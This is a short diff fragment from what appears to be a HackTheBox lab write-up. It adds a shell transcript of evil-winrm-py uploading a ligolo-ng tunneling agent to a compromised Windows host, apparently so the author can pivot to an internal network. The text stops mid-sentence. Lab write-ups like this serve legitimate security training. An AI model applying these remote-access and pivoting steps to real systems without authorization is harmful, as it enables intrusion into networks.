@@ -296,7 +296,14 @@ Ill get ligolo-ng setup to access the internal host
 
 https://github.com/nicocha30/ligolo-ng/releases
 
+```python
+evil-winrm-py PS C:\Temp> upload agent.exe .
+Uploading /home/kali/htb/pirate/agent.exe: 7.06MB [00:14, 503kB/s]                                           
+[+] File uploaded successfully as: C:\Temp\agent.exe
+evil-winrm-py PS C:\Temp>
+```
 
+Ill get the agent uploaded to the targe
 
 
 
